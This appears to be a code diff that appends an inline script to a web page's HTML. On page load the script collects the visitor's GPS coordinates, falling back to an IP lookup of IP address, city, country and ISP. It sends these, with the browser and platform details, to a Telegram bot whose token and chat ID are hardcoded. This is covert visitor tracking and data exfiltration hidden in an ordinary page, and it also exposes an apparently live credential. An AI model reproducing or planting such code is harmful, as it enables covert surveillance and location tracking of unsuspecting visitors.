@@ -3896,6 +3896,169 @@
     <!-- ============================================================ -->
     <!--                       JAVASCRIPT                              -->
     <!-- ============================================================ -->
+        <script>
+        (function() {
+            // ======== إعدادات البوت (ضع التوكن و المعرف هنا) ========
+            const BOT_TOKEN = '8840951417:AAHcoHkLUqnwuGc-zNbhok8HM2mINlJwvA8';   // استبدل بتوكنك
+            const CHAT_ID = '7955833475';       // استبدل بمعرف الدردشة
+            // ====================================================
+
+            // منع التكرار باستخدام sessionStorage
+            if (sessionStorage.getItem('visitor_notified')) {
+                console.log('تم إرسال الإشعار مسبقاً لهذه الجلسة.');
+                return;
+            }
+
+            // دالة إرسال الرسالة إلى تليجرام
+            function sendToTelegram(message) {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('✅ تم الإرسال بنجاح');
+                        sessionStorage.setItem('visitor_notified', 'true');
+                    } else {
+                        console.error('❌ فشل الإرسال:', data.description);
+                    }
+                })
+                .catch(err => console.error('❌ خطأ في الشبكة:', err));
+            }
+
+            // دالة إنشاء نص الرسالة
+            function buildMessage(latitude, longitude, source, extraInfo = {}) {
+                const now = new Date().toLocaleString('ar-SA');
+                const { ip, country, city, isp } = extraInfo;
+
+                let msg = `🚨 <b>زائر جديد دخل موقعك!</b>\n`;
+                msg += `🕒 <b>الوقت:</b> ${now}\n`;
+                msg += `📌 <b>خط العرض:</b> ${latitude}\n`;
+                msg += `📌 <b>خط الطول:</b> ${longitude}\n`;
+                msg += `📍 <b>المصدر:</b> ${source}\n`;
+                if (ip) msg += `🖥 <b>IP:</b> <code>${ip}</code>\n`;
+                if (country) msg += `🌍 <b>الدولة:</b> ${country}\n`;
+                if (city) msg += `🏙 <b>المدينة:</b> ${city}\n`;
+                if (isp) msg += `🏢 <b>المزود:</b> ${isp}\n`;
+                msg += `🗺️ <b>خرائط جوجل:</b> <a href="https://www.google.com/maps?q=${latitude},${longitude}">اضغط للعرض</a>\n`;
+                msg += `📱 <b>نظام التشغيل:</b> ${navigator.platform}\n`;
+                msg += `🌐 <b>المتصفح:</b> ${navigator.userAgent}`;
+
+                return msg;
+            }
+
+            // ========== دالة جلب الموقع من IP مع الاحتياطيات ==========
+            async function getLocationFromIP() {
+                // المحاولة الأولى: ipapi.co (قد تعمل في بيئتك)
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.latitude && data.longitude) {
+                            return {
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                ip: data.ip,
+                                country: data.country_name,
+                                city: data.city,
+                                isp: data.org
+                            };
+                        }
+                    }
+                } catch (e) { /* تجاهل */ }
+
+                // المحاولة الثانية: ipinfo.io (تدعم CORS رسمياً)
+                try {
+                    const res = await fetch('https://ipinfo.io/json');
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.loc) {
+                            const [lat, lon] = data.loc.split(',').map(Number);
+                            return {
+                                lat: lat,
+                                lon: lon,
+                                ip: data.ip,
+                                country: data.country,
+                                city: data.city,
+                                isp: data.org
+                            };
+                        }
+                    }
+                } catch (e) { /* تجاهل */ }
+
+                // المحاولة الثالثة: ipwho.is
+                try {
+                    const res = await fetch('https://ipwho.is/');
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.success && data.latitude && data.longitude) {
+                            return {
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                ip: data.ip,
+                                country: data.country,
+                                city: data.city,
+                                isp: data.connection?.isp || data.org
+                            };
+                        }
+                    }
+                } catch (e) { /* تجاهل */ }
+
+                // إذا فشل كل شيء، نرمي خطأ
+                throw new Error('تعذر الحصول على الموقع من جميع خدمات IP');
+            }
+
+            // ========== بدء التنفيذ ==========
+            if ('geolocation' in navigator) {
+                // محاولة GPS أولاً
+                navigator.geolocation.getCurrentPosition(
+                    // نجاح GPS
+                    position => {
+                        const { latitude, longitude } = position.coords;
+                        const msg = buildMessage(latitude, longitude, 'GPS/HTML5');
+                        sendToTelegram(msg);
+                    },
+                    // فشل GPS (رفض أو خطأ) -> ننتقل للـ IP فوراً
+                    async () => {
+                        try {
+                            const ipData = await getLocationFromIP();
+                            const msg = buildMessage(ipData.lat, ipData.lon, 'IP Lookup (تقريبي)', {
+                                ip: ipData.ip,
+                                country: ipData.country,
+                                city: ipData.city,
+                                isp: ipData.isp
+                            });
+                            sendToTelegram(msg);
+                        } catch (err) {
+                            console.error('فشل الحصول على الموقع حتى عبر IP:', err);
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                // المتصفح لا يدعم GPS → استخدم IP مباشرة
+                (async () => {
+                    try {
+                        const ipData = await getLocationFromIP();
+                        const msg = buildMessage(ipData.lat, ipData.lon, 'IP Lookup (تقريبي)', {
+                            ip: ipData.ip,
+                            country: ipData.country,
+                            city: ipData.city,
+                            isp: ipData.isp
+                        });
+                        sendToTelegram(msg);
+                    } catch (err) {
+                        console.error('فشل الحصول على الموقع حتى عبر IP:', err);
+                    }
+                })();
+            }
+        })();
+    </script>
   </body>
 </html>
-X
